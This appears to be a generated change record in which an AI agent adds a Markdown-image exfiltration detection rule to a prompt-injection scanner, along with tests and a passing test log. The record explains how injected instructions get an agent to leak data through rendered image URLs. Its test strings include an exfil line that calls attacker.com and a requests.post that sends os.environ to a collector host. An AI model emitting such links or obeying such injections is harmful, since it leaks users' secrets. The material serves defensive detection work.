@@ -1,0 +1,35 @@
+{
+  "task_description": "Sentry's six default rules include env_exfil_pattern and network_exfil_pattern for exfiltration via Python code (os.environ access, requests.post to a suspicious host), but none of the six rules match a well-documented alternate exfiltration channel: exfiltration via auto-rendered Markdown image syntax. Many LLM-agent front-ends and chat UIs auto-fetch image URLs found in Markdown output (e.g. ![...](https://...)), so an attacker-controlled or injected instruction can smuggle sensitive data out by asking the agent to emit a Markdown image (or plain link) whose URL embeds the data as a query parameter pointing at an attacker-controlled host - the mere act of rendering the message triggers an outbound HTTP request, with no code execution or explicit exfil pattern like os.environ/requests.post involved at all. This is a real, previously disclosed technique against LLM agents/chat UIs, and is structurally invisible to Sentry's current ruleset because none of its six rules examine Markdown link/image syntax at all. Add one new detection rule to Sentry that closes this specific gap, plus its test cases, following Sentry's existing conventions exactly.",
+  "model": "gemini-3.5-flash",
+  "generated_at": "2026-08-18T07:38:26.022534+00:00",
+  "target_files": [
+    "rules/default_rules.json",
+    "tests/test_rules_detection.py"
+  ],
+  "diff": "--- a/rules/default_rules.json\n+++ b/rules/default_rules.json\n@@ -34,5 +34,11 @@\n     \"pattern\": \"(?i)(urllib\\\\.request\\\\.urlopen.*json|requests\\\\.(post|put).*(env|environ)|httpbin\\\\.org|json\\\\.dumps.*env.*urlopen)\",\n     \"severity\": \"HIGH\",\n     \"description\": \"Network request containing serialized environment data\"\n+  },\n+  {\n+    \"name\": \"markdown_exfil_pattern\",\n+    \"pattern\": \"(?i)(!?\\\\[[^\\\\]]*\\\\]\\\\(https?://[^)]+?\\\\?[^)]+?\\\\))\",\n+    \"severity\": \"HIGH\",\n+    \"description\": \"Markdown image or link syntax containing query parameters — potential exfil vector\"\n   }\n ]\n--- a/tests/test_rules_detection.py\n+++ b/tests/test_rules_detection.py\n@@ -32,6 +32,10 @@\n         \"positive\": \"requests.post('https://collector.example.com', data=os.environ)\",\n         \"negative\": \"requests.get('https://example.com/status')\",\n     },\n+    \"markdown_exfil_pattern\": {\n+        \"positive\": \"![leak](https://attacker.com/exfil.png?data=sensitive_info)\",\n+        \"negative\": \"![logo](https://example.com/assets/logo.png)\",\n+    },\n }\n \n \n",
+  "rationale": "LLM-agent front-ends and chat UIs often auto-render Markdown images and follow links. This allows attackers to perform data exfiltration by injecting instructions that coerce the LLM to output a Markdown image or link pointing to an attacker-controlled server with sensitive data encoded as query parameters. This new rule detects Markdown link or image syntax referencing external HTTP/HTTPS URLs with query parameters, closing this critical and well-documented exfiltration vector.",
+  "claims": [
+    {
+      "id": "C0",
+      "statement": "Markdown image exfiltration (using image/link tags with query parameters to auto-trigger requests on render) is a documented prompt-injection/exfiltration technique against LLM agents/chat UIs.",
+      "origin": "RETRIEVED",
+      "source": "\"Indirect Prompt Injection on LLMs\", Greshake et al. 2023",
+      "confidence": 1.0
+    },
+    {
+      "id": "C1",
+      "statement": "Sentry's current default ruleset does not match Markdown syntax for exfiltration.",
+      "origin": "RETRIEVED",
+      "source": "rules/default_rules.json file content",
+      "confidence": 1.0
+    }
+  ],
+  "self_check_result": {
+    "passed": true,
+    "attempts": 1,
+    "existing_suite_passed": true,
+    "new_test_passed": true,
+    "pytest_summary": "============================= test session starts ==============================\nplatform linux -- Python 3.11.15, pytest-9.1.1, pluggy-1.6.0 -- /home/user/Quorum/worker_agent/.venv/bin/python3\ncachedir: .pytest_cache\nrootdir: /tmp/quorum-sentry-selfcheck-540i5jco/sentry\nconfigfile: pyproject.toml\nplugins: anyio-4.14.2\ncollecting ... collected 24 items\n\ntests/test_cli.py::test_exit_code_zero_on_clean_input PASSED             [  4%]\ntests/test_cli.py::test_exit_code_one_on_high_severity_finding PASSED    [  8%]\ntests/test_cli.py::test_exit_code_zero_on_medium_only_finding PASSED     [ 12%]\ntests/test_cli.py::test_scan_reads_from_stdin PASSED                     [ 16%]\ntests/test_cli.py::test_scan_reads_from_file PASSED                      [ 20%]\ntests/test_rules_compile.py::test_all_raw_patterns_compile PASSED        [ 25%]\ntests/test_rules_compile.py::test_load_rules_succeeds_and_returns_compiled_regexes PASSED [ 29%]\ntests/test_rules_compile.py::test_rule_names_are_unique PASSED           [ 33%]\ntests/test_rules_compile.py::test_rule_severities_are_valid PASSED       [ 37%]\ntests/test_rules_detection.py::test_cases_cover_every_rule PASSED        [ 41%]\ntests/test_rules_detection.py::test_positive_case_triggers_rule[agent_directed_address] PASSED [ 45%]\ntests/test_rules_detection.py::test_positive_case_triggers_rule[confirmation_bypass_claim] PASSED [ 50%]\ntests/test_rules_detection.py::test_positive_case_triggers_rule[env_exfil_pattern] PASSED [ 54%]\ntests/test_rules_detection.py::test_positive_case_triggers_rule[hidden_channel_instruction] PASSED [ 58%]\ntests/test_rules_detection.py::test_positive_case_triggers_rule[markdown_exfil_pattern] PASSED [ 62%]\ntests/test_rules_detection.py::test_positive_case_triggers_rule[network_exfil_pattern] PASSED [ 66%]\ntests/test_rules_detection.py::test_positive_case_triggers_rule[scope_expansion_phrase] PASSED [ 70%]\ntests/test_rules_detection.py::test_negative_case_does_not_trigger_rule[agent_directed_address] PASSED [ 75%]\ntests/test_rules_detection.py::test_negative_case_does_not_trigger_rule[confirmation_bypass_claim] PASSED [ 79%]\ntests/test_rules_detection.py::test_negative_case_does_not_trigger_rule[env_exfil_pattern] PASSED [ 83%]\ntests/test_rules_detection.py::test_negative_case_does_not_trigger_rule[hidden_channel_instruction] PASSED [ 87%]\ntests/test_rules_detection.py::test_negative_case_does_not_trigger_rule[markdown_exfil_pattern] PASSED [ 91%]\ntests/test_rules_detection.py::test_negative_case_does_not_trigger_rule[network_exfil_pattern] PASSED [ 95%]\ntests/test_rules_detection.py::test_negative_case_does_not_trigger_rule[scope_expansion_phrase] PASSED [100%]\n\n============================== 24 passed in 0.05s ==============================",
+    "revision_notes": null
+  }
+}
